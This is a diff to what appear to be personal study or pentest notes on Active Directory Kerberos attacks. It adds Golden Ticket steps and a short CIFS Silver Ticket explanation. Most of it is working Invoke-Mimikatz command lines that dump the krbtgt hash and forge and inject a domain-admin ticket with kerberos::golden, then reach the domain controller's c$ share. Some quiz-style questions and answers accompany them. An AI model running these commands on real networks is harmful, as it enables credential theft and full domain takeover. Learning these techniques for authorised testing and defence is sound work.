@@ -191,8 +191,38 @@ C:> invoke-mimikatz -command '"lsadump::lsa /inject"' -Computername prod.researc
 C:> invoke-mimikatz -command '"kerberos::golden /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440(domin-user) /target:prod.research.security.local /service:CIFS /rc4:f2c8slad8245023845(KDC's NTLM hash) 
 /user:administrator /ptt"'
 
+CIFS is a protocol used for sharing files, printers, and serial ports over a network.
+When an attacker forges a Silver Ticket for the CIFS service, they are essentially creating a ticket that grants access to file shares on the network.
+
 4. Check the ticket
 C:> klist 
+
+5. Finally can access the domain controller
+ls \\prod.research.security.local\c$
+_______________________________________________________________________________________________________________________________________________________________________________________________
+Golden ticket
+-------------
+What is the primary objective of a Golden Ticket attack in Active Directory? > To impersonate legitimate users and access network resources without detection
+
+Which type of Kerberos ticket is forged in a Golden Ticket attack? > Ticket Granting Ticket (TGT)
+
+Golden ticket attack > kerberos identity authentication protocol attack > krbtgt(a service account that issues with kerberos ticket)
+
+1. Pass the hash to domain admin
+
+2. Get Krbtgt account hash
+C:> invoke-mimikatz -command '"lsadump::lsa /patch"' -Computername prod.research.SECURITY.local
+
+3. Generate silver ticket to the administrator with KDC
+
+C:> invoke-mimikatz -command '"kerberos::golden /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440(domin-user) /krbtgt:03842934823jdf29234532 
+/id:500 /group:512 /startoffset:0 /endin:600 renewmax:10080 /ptt"'
+
+4. Check the ticket
+C:> klist 
+
+If you want to delete all tickets,
+C:> klist purge
 
 5. Finally can access the domain controller
 ls \\prod.research.security.local\c$
@@ -203,11 +233,6 @@ ________________________________________________________________________________
 
 
 
+
 _______________________________________________________________________________________________________________________________________________________________________________________________
-
-Golden ticket attack > kerberos identity authentication protocol attack > krbtgt(a service account that issues with kerberos ticket)
-
-What is the primary objective of a Golden Ticket attack in Active Directory? > To impersonate legitimate users and access network resources without detection
-
-Which type of Kerberos ticket is forged in a Golden Ticket attack? > Ticket Granting Ticket (TGT)
 
